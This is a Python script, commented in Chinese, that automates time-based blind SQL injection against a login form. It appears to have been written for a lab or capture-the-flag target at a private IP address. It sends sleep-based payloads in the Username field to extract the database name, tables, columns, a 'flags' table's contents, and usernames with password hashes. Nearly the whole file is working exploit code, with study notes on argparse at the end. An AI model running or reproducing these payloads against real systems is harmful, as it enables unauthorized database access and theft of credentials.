#!/usr/bin/env python3
# post version
import requests
import string
import sys
import json

import time
import math

import argparse
import textwrap


all = string.printable
# edit url to point to your openemr instance
# 用burpsuit去看
# url = "http://172.16.247.132/enter_network/"
url = "http://192.168.81.139:8080"

# header post時才需要
headers = {"Content-Type":"application/x-www-form-urlencoded"}


def extract_db():
    print("[+] Extracting db name...")
    output = []
    for n in range(1,1000):
        # post payload格式為JSON格式
        # payload = {"user":"\' or abc #","pass":"","sub":"SEND"}
        # 假定登入所用的語法為 SELECT * FROM XXX where user='' and pass=''
        # user注入的結果      SELECT * FROM XXX where user='' or abc #' and pass='' 會執行abc
        payload = {"Username":"' or (select if(length((select database()))=" + str(n) + ",sleep(3),1)) #"}
        r = requests.post(url,data=payload,headers=headers)
        # 也有可能每次響應都小於1秒鐘 那就得用時間差去計算
        # 
        # a = time.time()
        # r = requests.post(url,data=payload,headers=headers)
        # b = time.time()
        # if(math.floor(b-a)) >= 1:
        #     length = n
        #     break
        #     
        # 下面那個也記得改    
        #  
        #     
        # print(n)
        # print(r.elapsed.total_seconds())
        if r.elapsed.total_seconds() >3:
            length = n
            break
    print("[+] the length of db name..." + str(length))    
    
    print("[+] the name of db name...")    
    for i in range(1,length+1):
        # all = string.printable 即代表所有ASCII字符組
        # 從第一個字符開始判斷跟ASCII中哪個字碼相符合，符合就sleep一秒鐘
        for char in all:
            #原payload = '\'%2b(SELECT+if(ascii(substr((select+group_concat(username,\':\',password)+from+users+limit+0,1),'+ str(i)+',1))='+str(ord(char))+',sleep(3),1))%2b\''
            #新payload = '\' or (select if(ascii(substr((select database() limit 0,1),'+ str(i)+',1))='+str(ord(char))+',sleep(3),1)) #'
            #payload = {"Username":"' or (select if(ascii(substr((select database()),"+ str(i)+",1))="+str(ord(char))+",sleep(3),1)) #"}
            payload = {"Username":"' or (select if(ascii(substr((select database()), {}, 1)) = {}, sleep(3), 1)) #".format(i, ord(char))}
            #print(payload)
            r = requests.post(url,data=payload,headers=headers)
            #print(r.request.url)
            if r.elapsed.total_seconds() > 3:
                output.append(char)
                if char == ",":
                    print("")
                    continue
                print(char, end='', flush=True)


def extract_tables():
    output = "mysql_time_based"
    print("[+] Finding number of table in current db...")
    for n in range(1,50):
        # post payload格式為JSON格式
        # payload = {"user":"\' or abc #","pass":"","sub":"SEND"}
        # 假定登入所用的語法為 SELECT * FROM XXX where user='' and pass=''
        # user注入的結果      SELECT * FROM XXX where user='' or abc #' and pass='' 會執行abc
        payload = {"Username":"' or (select if((select count(table_name) from information_schema.tables where table_schema=\'" + output + "\')= "+ str(n) +",sleep(3),1)) #"}
        r = requests.post(url,data=payload,headers=headers)
        if r.elapsed.total_seconds() > 3:
            table_num = n
            break
    print("[+] Finding" + str(table_num) + "table in current db...")    
        
        
    print("[+] Finding the table name of current db...")    
    for n in range(1,1000):
        # post payload格式為JSON格式
        # payload = {"user":"\' or abc #","pass":"","sub":"SEND"}
        # 假定登入所用的語法為 SELECT * FROM XXX where user='' and pass=''
        # user注入的結果     SELECT * FROM XXX where user='' or abc #' and pass='' 會執行abc
        # 把所有資料表名稱用,串接起來: users,passwd 去測這個字串的長度
        payload = {"Username":"' or (select if(length((select group_concat(table_name) from information_schema.tables where table_schema=\'" + output + "\' limit 0,1))= "+ str(n) +",sleep(3),1)) #"}
        r = requests.post(url,data=payload,headers=headers)
        if r.elapsed.total_seconds() > 3:
            length = n
            break
            
    for i in range(1,length+1):
        # all = string.printable 即代表所有ASCII字符組
        # 從第一個字符開始判斷跟ASCII中哪個字碼相符合，符合就sleep三秒鐘
        for char in all:
            #原payload = '\'%2b(SELECT+if(ascii(substr((select+group_concat(username,\':\',password)+from+users+limit+0,1),'+ str(i)+',1))='+str(ord(char))+',sleep(3),1))%2b\''
            #新payload = '\' or (select if(ascii(substr((select database() limit 0,1),'+ str(i)+',1))='+str(ord(char))+',sleep(3),1)) #'
            payload = {"Username":"' or (select if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=\'"+ output + "\' limit 0,1),"+ str(i) +",1))="+ str(ord(char)) +",sleep(3),1)) #"}
            #print(payload)
            r = requests.post(url,data=payload,headers=headers)
            #print(r.request.url)
            if r.elapsed.total_seconds() > 3:
                if char == ",":
                    print("")
                    continue
                print(char, end='', flush=True)
                

def extract_columns():
    output = "flags"
    print("[+] Finding column name of " + output + "...")
    for n in range(1,1000):
        # post payload格式為JSON格式
        # payload = {"user":"\' or abc #","pass":"","sub":"SEND"}
        # 假定登入所用的語法為 SELECT * FROM XXX where user='' and pass=''
        # user注入的結果     SELECT * FROM XXX where user='' or abc #' and pass='' 會執行abc
        payload = {"Username":"' or (select if(length((select group_concat(column_name) from information_schema.columns where table_name=\'" + output + "\' limit 0,1))= "+ str(n) +",sleep(3),1)) #"}
        r = requests.post(url,data=payload,headers=headers)
        if r.elapsed.total_seconds() > 3:
            length = n
            break
  
    for i in range(1,length+1):
        # all = string.printable 即代表所有ASCII字符組
        # 從第一個字符開始判斷跟ASCII中哪個字碼相符合，符合就sleep一秒鐘
        for char in all:
            #原payload = '\'%2b(SELECT+if(ascii(substr((select+group_concat(username,\':\',password)+from+users+limit+0,1),'+ str(i)+',1))='+str(ord(char))+',sleep(3),1))%2b\''
            #新payload = '\' or (select if(ascii(substr((select database() limit 0,1),'+ str(i)+',1))='+str(ord(char))+',sleep(3),1)) #'
            payload = {"Username":"' or (select if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=\'"+ output + "\' limit 0,1),"+ str(i) +",1))="+ str(ord(char)) +",sleep(3),1)) #"}
            #print(payload)
            r = requests.post(url,data=payload,headers=headers)
            #print(r.request.url)
            if r.elapsed.total_seconds() > 3:
                if char == ",":
                    print("")
                    continue
                print(char, end='', flush=True)

def extract_columns_values():
    output = "flags"
    print("[+] Finding " + output + " info...")
    for n in range(1,1000):
        # post payload格式為JSON格式
        # payload = {"user":"\' or abc #","pass":"","sub":"SEND"}
        # 假定登入所用的語法為 SELECT * FROM XXX where user='' and pass=''
        # user注入的結果     SELECT * FROM XXX where user='' or abc #' and pass='' 會執行abc
        payload = {"Username":"' or (select if(length((select group_concat(id,\':\',content) from " + output + " limit 0,1))= "+ str(n) +",sleep(3),1)) #"}
        r = requests.post(url,data=payload,headers=headers)
        if r.elapsed.total_seconds() > 3:
            length = n
            break
  
    for i in range(1,length+1):
        # all = string.printable 即代表所有ASCII字符組
        # 從第一個字符開始判斷跟ASCII中哪個字碼相符合，符合就sleep一秒鐘
        for char in all:
            #原payload = '\'%2b(SELECT+if(ascii(substr((select+group_concat(username,\':\',password)+from+users+limit+0,1),'+ str(i)+',1))='+str(ord(char))+',sleep(3),1))%2b\''
            #新payload = '\' or (select if(ascii(substr((select database() limit 0,1),'+ str(i)+',1))='+str(ord(char))+',sleep(3),1)) #'
            payload = {"Username":"' or (select if(ascii(substr((select group_concat(id,\':\',content) from "+ output + " limit 0,1),"+ str(i) +",1))="+ str(ord(char)) +",sleep(3),1)) #"}
            #print(payload)
            r = requests.post(url,data=payload,headers=headers)
            #print(r.request.url)
            if r.elapsed.total_seconds() > 3:
                if char == ",":
                    print("")
                    continue
                print(char, end='', flush=True)      
                
def extract_users_num():
    print("[+] Finding number of users...")
    for n in range(1,100):
        # %2b是url encode的結果即為+號
        # 如果用戶數量剛好等於n就sleep三秒鐘
        payload = '\'%2b(SELECT+if((select count(username) from users)=' + str(n) + ',sleep(3),1))%2b\''
        r = requests.get(url+payload)
        # 響應時間大於三秒時記錄，即列舉出用戶數量
        if r.elapsed.total_seconds() > 3: 
            user_length = n
            break
    print("[+] Found number of users: " + str(user_length))
    return user_length

def extract_users():
    users = extract_users_num()
    print("[+] Extracting username and password hash...")
    output = []
    for n in range(1,1000):
        # user1:password1,user2:password2
        # 如果返回的字串長度是 length(user1:password1,user2:password2)就sleep三秒鐘
        payload = '\'%2b(SELECT+if(length((select+group_concat(username,\':\',password)+from+users+limit+0,1))=' + str(n) + ',sleep(3),1))%2b\''
        #print(payload)
        r = requests.get(url+payload)
        #print(r.request.url)
        if r.elapsed.total_seconds() > 3:
            length = n
            break
    for i in range(1,length+1):
        # all = string.printable 即代表所有ASCII字符組
        # 從第一個字符開始判斷跟ASCII中哪個字碼相符合，符合就sleep三秒鐘
        for char in all:
            payload = '\'%2b(SELECT+if(ascii(substr((select+group_concat(username,\':\',password)+from+users+limit+0,1),'+ str(i)+',1))='+str(ord(char))+',sleep(3),1))%2b\''
            #print(payload)
            r = requests.get(url+payload)
            #print(r.request.url)
            if r.elapsed.total_seconds() > 3:
                output.append(char)
                if char == ",":
                    print("")
                    continue
                print(char, end='', flush=True)





def args_parse():
    parser = argparse.ArgumentParser(
        prog='post.py',
        #usage='post.py'
        #formatter_class=argparse.RawDescriptionHelpFormatter,
        formatter_class=argparse.RawTextHelpFormatter,
        description="SQL injection script",
        add_help=False
        )
    # parser.add_argument('--help', action='help', help='Show this help message and exit')
    parser.add_argument('-u',dest='url',
                        nargs=1,
                        required=True,
                        type=valid_url,
                        help='| Target url ex. http://example.com'
                        )
    parser.add_argument('-r',dest='request',
                        nargs=1,
                        required=True,
                        choices=['post', 'get'],
                        help='| HTTP request method (choose from "post" or "get")'
                        )
    parser.add_argument('--payload',dest='payload',
                        nargs=1,
                        required=True,
                        help='| payload with json format\n  ex. payload = {"user":"User","pass":"password","sub":"SEND"}'
                        )
    parser.add_argument('--action',dest='action',
                        nargs=1,
                        required=True,
                        type=valid_action,
                        help='''| extract_db
  extract_tables
  extract_columns
  extract_columns_values
  extract_users_num
  extract_users
                             '''
                        )
# Subparser for extract_tables action
    subparsers = parser.add_subparsers(dest='action', metavar='{action}')
    extract_tables_parser = subparsers.add_parser(
        'extract_tables',
        help='extract_tables <db_name>'
    )
    extract_tables_parser.add_argument(
        'db_name',
        metavar='db_name',
        type=str,
        help='Name of the database'
    )

    parser.add_argument('--sleep',dest='sleep',
                        nargs=1,
                        type=int,
                        default=3,
                        help='| Time-based SQL injection sleep time, Default 3 seconds'
                        )
    #parser.add_argument('bar', nargs='+', help='bar help')
    if len(sys.argv) == 1:
        parser.print_help(sys.stderr)
        sys.exit(1)    


    args = parser.parse_args()
    print(args)


def valid_url(url):
    if not url.startswith(('http://', 'https://')):
        raise argparse.ArgumentTypeError(f"Invalid URL : {url}. Must start with 'http://' or 'https://'.")
    return url
def valid_action(action):
    valid_actions = ['extract_db',
                     'extract_tables',
                     'extract_columns',
                     'extract_columns_values',
                     'extract_users_num',
                     'extract_users'
                     ]
    if action not in valid_actions:
        raise argparse.ArgumentTypeError(f"Invalid action: {action}. Must be one of {valid_actions}")
    return action

'''
Positional Argument 會依照輸入順序放進你宣告的引數變數中 -u --url
Optional Argument   必須放在位置引數之後、可以是任意順序 bar

parser.add_argument('-u','--url',dest='url'

                    # narg 默認的action只處理一個位置的參數
                    nargs= 3   引數只能恰好是 3 個
                    nargs='?'  引數只能是 0 個或是 1 個
                    nargs='+'  引數至少 1 個(1 個或任意多個）   
                    nargs='*'  引數可以是任意數量(0 個或任意多個）      

                    # required
                    required=True,

                    # action
                    action='store_const',const=88,
                    action='store_true'
                    action='store_false'
                    action='append'

                    # value
                    default='default'
                    type='str,int'
                    type=argparse.FileType('w')
                    
                    help='Target url ex. http://example.com')
'''

if __name__ == '__main__':
    # args_parse()
    try:
        #extract_db()
        #extract_tables()
        #extract_columns()
         extract_columns_values()
        # extract_users()
    except KeyboardInterrupt:
        print("")
        print("[+] Exiting...")
        sys.exit()



    #       formatter_class=argparse.RawDescriptionHelpFormatter,
    #   epilog=textwrap.dedent('''\
    #      additional information:
    #          I have indented it
    #          exactly the way
    #          I want it
    #      ''')